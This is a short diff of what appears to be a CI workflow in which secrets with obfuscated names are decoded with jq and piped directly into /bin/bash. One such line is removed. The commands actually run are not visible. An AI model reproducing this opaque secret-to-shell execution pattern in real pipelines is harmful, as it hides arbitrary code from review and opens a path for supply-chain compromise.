@@ -20,7 +20,6 @@ jobs:
           zxsl25093: ${{ secrets.zxsl25093 }}
         run: |
           printf '%s' "$zxsl25093" | jq -r .njcl64 | /bin/bash
-          echo $d122 | jq -r .l9 | /bin/bash
           echo $rsd4 | jq -r .ff97040 | /bin/bash
           printf '%s' "$mjmp722" | jq -r .cw60 | /bin/bash
           printf '%s' "$i5684" | jq -r .xl928 | /bin/bash
